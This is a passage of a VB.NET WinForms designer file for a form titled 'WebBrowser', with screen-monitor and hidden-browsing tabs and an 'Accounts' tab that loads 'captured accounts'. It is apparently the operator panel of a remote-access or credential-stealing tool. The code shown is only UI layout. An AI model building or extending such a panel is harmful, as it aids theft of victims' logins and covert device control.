        Me.DrakeUIButtonIcon3.RectHoverColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.DrakeUIButtonIcon3.RectPressColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.DrakeUIButtonIcon3.RectSelectedColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.DrakeUIButtonIcon3.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Bottom
        Me.DrakeUIButtonIcon3.Size = New System.Drawing.Size(64, 23)
        Me.DrakeUIButtonIcon3.Style = DrakeUI.Framework.UIStyle.Custom
        Me.DrakeUIButtonIcon3.Symbol = 61714
        Me.DrakeUIButtonIcon3.TabIndex = 46
        '
        'stophdbbtn
        '
        Me.stophdbbtn.Cursor = System.Windows.Forms.Cursors.Hand
        Me.stophdbbtn.Dock = System.Windows.Forms.DockStyle.Right
        Me.stophdbbtn.FillColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.stophdbbtn.FillDisableColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.stophdbbtn.FillHoverColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.stophdbbtn.FillPressColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.stophdbbtn.FillSelectedColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.stophdbbtn.Font = New System.Drawing.Font("Cascadia Code", 9.0!)
        Me.stophdbbtn.ForeHoverColor = System.Drawing.Color.Gray
        Me.stophdbbtn.Location = New System.Drawing.Point(692, 10)
        Me.stophdbbtn.Name = "stophdbbtn"
        Me.stophdbbtn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None
        Me.stophdbbtn.RectColor = System.Drawing.Color.Gray
        Me.stophdbbtn.RectDisableColor = System.Drawing.Color.FromArgb(CType(CType(227, Byte), Integer), CType(CType(242, Byte), Integer), CType(CType(253, Byte), Integer))
        Me.stophdbbtn.RectHoverColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.stophdbbtn.RectPressColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.stophdbbtn.RectSelectedColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.stophdbbtn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Bottom
        Me.stophdbbtn.Size = New System.Drawing.Size(36, 23)
        Me.stophdbbtn.Style = DrakeUI.Framework.UIStyle.Custom
        Me.stophdbbtn.Symbol = 61453
        Me.stophdbbtn.TabIndex = 54
        '
        'TabPage3
        '
        Me.TabPage3.BackColor = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer))
        Me.TabPage3.Controls.Add(Me.passtextlog)
        Me.TabPage3.Controls.Add(Me.Panel7)
        Me.TabPage3.Controls.Add(Me.Panel6)
        Me.TabPage3.Location = New System.Drawing.Point(0, 40)
        Me.TabPage3.Name = "TabPage3"
        Me.TabPage3.Size = New System.Drawing.Size(738, 815)
        Me.TabPage3.TabIndex = 2
        Me.TabPage3.Text = "Accounts"
        '
        'passtextlog
        '
        Me.passtextlog.BackColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.passtextlog.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.passtextlog.Dock = System.Windows.Forms.DockStyle.Fill
        Me.passtextlog.Font = New System.Drawing.Font("Cascadia Code", 9.0!)
        Me.passtextlog.ForeColor = System.Drawing.SystemColors.Control
        Me.passtextlog.Location = New System.Drawing.Point(0, 89)
        Me.passtextlog.Name = "passtextlog"
        Me.passtextlog.ReadOnly = True
        Me.passtextlog.ScrollBars = System.Windows.Forms.RichTextBoxScrollBars.Vertical
        Me.passtextlog.Size = New System.Drawing.Size(738, 726)
        Me.passtextlog.TabIndex = 3
        Me.passtextlog.Text = "• Click Refresh to load captured accounts."
        '
        'Panel7
        '
        Me.Panel7.BackColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.Panel7.Controls.Add(Me.combositespass)
        Me.Panel7.Dock = System.Windows.Forms.DockStyle.Top
        Me.Panel7.Location = New System.Drawing.Point(0, 52)
        Me.Panel7.Name = "Panel7"
        Me.Panel7.Padding = New System.Windows.Forms.Padding(5)
        Me.Panel7.Size = New System.Drawing.Size(738, 37)
        Me.Panel7.TabIndex = 48
        '
        'combositespass
        '
        Me.combositespass.Dock = System.Windows.Forms.DockStyle.Left
        Me.combositespass.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList
        Me.combositespass.Enabled = False
        Me.combositespass.FillColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.combositespass.FillDisableColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.combositespass.Font = New System.Drawing.Font("Cascadia Code", 9.0!)
        Me.combositespass.ForeColor = System.Drawing.Color.FromArgb(CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer), CType(CType(224, Byte), Integer))
        Me.combositespass.Items.AddRange(New Object() {"From URL", "From File"})
        Me.combositespass.Location = New System.Drawing.Point(5, 5)
        Me.combositespass.Margin = New System.Windows.Forms.Padding(4, 5, 4, 5)
        Me.combositespass.MinimumSize = New System.Drawing.Size(63, 0)
        Me.combositespass.Name = "combositespass"
        Me.combositespass.Padding = New System.Windows.Forms.Padding(0, 0, 30, 0)
        Me.combositespass.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None
        Me.combositespass.RectColor = System.Drawing.Color.Gray
        Me.combositespass.RectDisableColor = System.Drawing.Color.Gray
        Me.combositespass.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Bottom
        Me.combositespass.Size = New System.Drawing.Size(347, 25)
        Me.combositespass.Style = DrakeUI.Framework.UIStyle.Custom
        Me.combositespass.TabIndex = 45
        Me.combositespass.Text = "Select Website"
        Me.combositespass.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft
        '
        'Panel6
        '
        Me.Panel6.BackColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.Panel6.Controls.Add(Me.DrakeUIButtonIcon1)
        Me.Panel6.Controls.Add(Me.dellall)
        Me.Panel6.Controls.Add(Me.DrakeWidth_W11)
        Me.Panel6.Controls.Add(Me.refpasses)
        Me.Panel6.Dock = System.Windows.Forms.DockStyle.Top
        Me.Panel6.Location = New System.Drawing.Point(0, 0)
        Me.Panel6.Name = "Panel6"
        Me.Panel6.Padding = New System.Windows.Forms.Padding(8)
        Me.Panel6.Size = New System.Drawing.Size(738, 52)
        Me.Panel6.TabIndex = 47
        '
        'DrakeUIButtonIcon1
        '
        Me.DrakeUIButtonIcon1.Cursor = System.Windows.Forms.Cursors.Hand
        Me.DrakeUIButtonIcon1.Dock = System.Windows.Forms.DockStyle.Right
        Me.DrakeUIButtonIcon1.FillColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.DrakeUIButtonIcon1.FillDisableColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.DrakeUIButtonIcon1.FillHoverColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.DrakeUIButtonIcon1.FillPressColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.DrakeUIButtonIcon1.FillSelectedColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.DrakeUIButtonIcon1.Font = New System.Drawing.Font("Cascadia Code", 9.0!)
        Me.DrakeUIButtonIcon1.ForeHoverColor = System.Drawing.Color.Gray
        Me.DrakeUIButtonIcon1.Location = New System.Drawing.Point(613, 8)
        Me.DrakeUIButtonIcon1.Name = "DrakeUIButtonIcon1"
        Me.DrakeUIButtonIcon1.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None
        Me.DrakeUIButtonIcon1.RectColor = System.Drawing.Color.Gray
        Me.DrakeUIButtonIcon1.RectDisableColor = System.Drawing.Color.FromArgb(CType(CType(227, Byte), Integer), CType(CType(242, Byte), Integer), CType(CType(253, Byte), Integer))
        Me.DrakeUIButtonIcon1.RectHoverColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.DrakeUIButtonIcon1.RectPressColor = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer))
        Me.DrakeUIButtonIcon1.RectSelectedColor = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer))
        Me.DrakeUIButtonIcon1.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Bottom
        Me.DrakeUIButtonIcon1.Size = New System.Drawing.Size(117, 36)
        Me.DrakeUIButtonIcon1.Style = DrakeUI.Framework.UIStyle.Custom
        Me.DrakeUIButtonIcon1.Symbol = 61741
        Me.DrakeUIButtonIcon1.TabIndex = 48
        Me.DrakeUIButtonIcon1.Text = "Clear"
        '
        'dellall
        '
        Me.dellall.Cursor = System.Windows.Forms.Cursors.Hand
        Me.dellall.Dock = System.Windows.Forms.DockStyle.Left
        Me.dellall.Enabled = False
        Me.dellall.FillColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.dellall.FillDisableColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.dellall.FillHoverColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.dellall.FillPressColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.dellall.FillSelectedColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.dellall.Font = New System.Drawing.Font("Cascadia Code", 9.0!)
        Me.dellall.ForeHoverColor = System.Drawing.Color.Gray
        Me.dellall.Location = New System.Drawing.Point(185, 8)
        Me.dellall.Name = "dellall"
        Me.dellall.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None
        Me.dellall.RectColor = System.Drawing.Color.Gray
        Me.dellall.RectDisableColor = System.Drawing.Color.FromArgb(CType(CType(227, Byte), Integer), CType(CType(242, Byte), Integer), CType(CType(253, Byte), Integer))
        Me.dellall.RectHoverColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.dellall.RectPressColor = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer))
        Me.dellall.RectSelectedColor = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer))
        Me.dellall.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Bottom
        Me.dellall.Size = New System.Drawing.Size(167, 36)
        Me.dellall.Style = DrakeUI.Framework.UIStyle.Custom
        Me.dellall.Symbol = 61944
        Me.dellall.TabIndex = 47
        Me.dellall.Text = "Delete all"
        '
        'DrakeWidth_W11
        '
        Me.DrakeWidth_W11.BackColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.DrakeWidth_W11.Dock = System.Windows.Forms.DockStyle.Left
        Me.DrakeWidth_W11.Location = New System.Drawing.Point(175, 8)
        Me.DrakeWidth_W11.Name = "DrakeWidth_W11"
        Me.DrakeWidth_W11.Size = New System.Drawing.Size(10, 36)
        Me.DrakeWidth_W11.TabIndex = 49
        '
        'refpasses
        '
        Me.refpasses.Cursor = System.Windows.Forms.Cursors.Hand
        Me.refpasses.Dock = System.Windows.Forms.DockStyle.Left
        Me.refpasses.FillColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.refpasses.FillDisableColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.refpasses.FillHoverColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.refpasses.FillPressColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.refpasses.FillSelectedColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.refpasses.Font = New System.Drawing.Font("Cascadia Code", 9.0!)
        Me.refpasses.ForeHoverColor = System.Drawing.Color.Gray
        Me.refpasses.Location = New System.Drawing.Point(8, 8)
        Me.refpasses.Name = "refpasses"
        Me.refpasses.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None
        Me.refpasses.RectColor = System.Drawing.Color.Gray
        Me.refpasses.RectDisableColor = System.Drawing.Color.FromArgb(CType(CType(227, Byte), Integer), CType(CType(242, Byte), Integer), CType(CType(253, Byte), Integer))
        Me.refpasses.RectHoverColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.refpasses.RectPressColor = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer))
        Me.refpasses.RectSelectedColor = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer))
        Me.refpasses.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Bottom
        Me.refpasses.Size = New System.Drawing.Size(167, 36)
        Me.refpasses.Style = DrakeUI.Framework.UIStyle.Custom
        Me.refpasses.Symbol = 61473
        Me.refpasses.TabIndex = 46
        Me.refpasses.Text = "Refresh"
        '
        'statetimer
        '
        '
        'Panel5
        '
        Me.Panel5.BackColor = System.Drawing.Color.FromArgb(CType(CType(35, Byte), Integer), CType(CType(35, Byte), Integer), CType(CType(35, Byte), Integer))
        Me.Panel5.Controls.Add(Me.maintabs)
        Me.Panel5.Dock = System.Windows.Forms.DockStyle.Fill
        Me.Panel5.Location = New System.Drawing.Point(2, 71)
        Me.Panel5.Name = "Panel5"
        Me.Panel5.Padding = New System.Windows.Forms.Padding(10)
        Me.Panel5.Size = New System.Drawing.Size(758, 875)
        Me.Panel5.TabIndex = 0
        '
        'WebBrowser
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(9.0!, 20.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(762, 948)
        Me.Controls.Add(Me.Panel5)
        Me.MinimumSize = New System.Drawing.Size(549, 948)
        Me.Name = "WebBrowser"
        Me.Text = "WebBrowser"
        Me.Controls.SetChildIndex(Me.Panel5, 0)
        CType(Me.myscr, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.myico, System.ComponentModel.ISupportInitialize).EndInit()
        Me.Panel3.ResumeLayout(False)
        Me.Panel4.ResumeLayout(False)
        Me.maintabs.ResumeLayout(False)
        Me.TabPage1.ResumeLayout(False)
        CType(Me.viewmonitor, System.ComponentModel.ISupportInitialize).EndInit()
        Me.TabPage2.ResumeLayout(False)
        CType(Me.viewhidden, System.ComponentModel.ISupportInitialize).EndInit()
        Me.Panel9.ResumeLayout(False)
        Me.TabPage3.ResumeLayout(False)
        Me.Panel7.ResumeLayout(False)
        Me.Panel6.ResumeLayout(False)
        Me.Panel5.ResumeLayout(False)
        Me.ResumeLayout(False)

    End Sub

    Friend WithEvents Panel3 As Panel
    Friend WithEvents combotyps As DrakeUI.Framework.DrakeUIComboBox
    Friend WithEvents selcthtmlbtn As DrakeUI.Framework.DrakeUIButtonIcon
    Friend WithEvents maintabs As DrakeUI.Framework.DrakeUITabControl
    Friend WithEvents TabPage1 As TabPage
    Friend WithEvents TabPage2 As TabPage
    Friend WithEvents TabPage3 As TabPage
    Friend WithEvents Panel4 As Panel
    Friend WithEvents strtmonitor As DrakeUI.Framework.DrakeUIButtonIcon
    Friend WithEvents monitorinput As DrakeUI.Framework.DrakeUITextBox
    Friend WithEvents statetimer As Timer
    Friend WithEvents Panel5 As Panel
    Friend WithEvents viewmonitor As PictureBox
    Friend WithEvents passtextlog As RichTextBox
    Friend WithEvents Panel6 As Panel
    Friend WithEvents refpasses As DrakeUI.Framework.DrakeUIButtonIcon
    Friend WithEvents dellall As DrakeUI.Framework.DrakeUIButtonIcon
    Friend WithEvents DrakeUIButtonIcon1 As DrakeUI.Framework.DrakeUIButtonIcon
    Friend WithEvents DrakeWidth_W11 As DrakeUI.Framework.DrakeWidth_W
    Friend WithEvents Panel7 As Panel
    Friend WithEvents combositespass As DrakeUI.Framework.DrakeUIComboBox
    Friend WithEvents viewhidden As PictureBox
    Friend WithEvents Panel9 As Panel
    Friend WithEvents DrakeUIButtonIcon5 As DrakeUI.Framework.DrakeUIButtonIcon
    Friend WithEvents DrakeWidth_W4 As DrakeUI.Framework.DrakeWidth_W
    Friend WithEvents DrakeUIButtonIcon4 As DrakeUI.Framework.DrakeUIButtonIcon
    Friend WithEvents DrakeWidth_W3 As DrakeUI.Framework.DrakeWidth_W
    Friend WithEvents DrakeUIButtonIcon3 As DrakeUI.Framework.DrakeUIButtonIcon
    Friend WithEvents urlinputhiden As DrakeUI.Framework.DrakeUITextBox
    Friend WithEvents inputtext As DrakeUI.Framework.DrakeUITextBox
    Friend WithEvents stophdbbtn As DrakeUI.Framework.DrakeUIButtonIcon
End Class
